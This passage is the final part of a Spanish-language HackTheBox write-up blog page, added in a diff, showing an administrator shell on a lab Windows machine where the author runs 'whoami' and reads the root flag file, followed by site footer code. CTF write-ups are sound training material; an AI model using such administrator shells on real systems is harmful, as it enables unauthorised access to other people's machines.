+C:\Windows\system32&gt;whoami
+whoami
+access\administrator
+
+C:\Windows\system32&gt;cd c:\Users\Administrator\Desktop\
+cd c:\Users\Administrator\Desktop\
+</code></pre>
+
+<h1 id="cat-root-txt"><em>cat root.txt</em></h1>
+
+<p>Simplemente obtenemos la flag:</p>
+
+<pre><code class="language-text">C:\Users\Administrator\Desktop&gt;type root.txt
+type root.txt
+</code></pre>
+
+<p>&hellip; and we got root flag and user flag.</p>
+
+<hr />
+
+<p>Gracias por llegar hasta aquí, hasta la próxima!</p>
+    </div>
+
+    
+    
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          
+          <a href="/tags/hackthebox/">hackthebox</a>
+          
+          <a href="/tags/htb/">htb</a>
+          
+          <a href="/tags/passthehash/">passthehash</a>
+          
+          <a href="/tags/rce/">rce</a>
+          
+          <a href="/tags/windows/">windows</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+        
+          <a class="next" href="/post/htb_writeup_-_zipper/">
+            <span class="next-text nav-default">HTB Writeup: Zipper</span>
+            <span class="next-text nav-mobile">Siguiente</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+  <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    (function() {
+      
+      
+      if (window.location.hostname === 'localhost') return;
+
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      var disqus_shortname = 'xbytemx';
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="https://twitter.com/xbytemx" class="iconfont icon-twitter" title="twitter"></a>
+      <a href="https://github.com/xbytemx" class="iconfont icon-github" title="github"></a>
+  <a href="https://xbytemx.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Creado con <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Tema - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    
+      2018 - 
+    2019
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">Tony Palma</span>
+  </span>
+</div>
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+<script src="/lib/highlight/highlight.pack.js?v=20171001"></script><script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox-3.1.20.min.js"></script>
+
+
+<script type="text/javascript" src="/dist/even.min.js?v=3.2.0"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
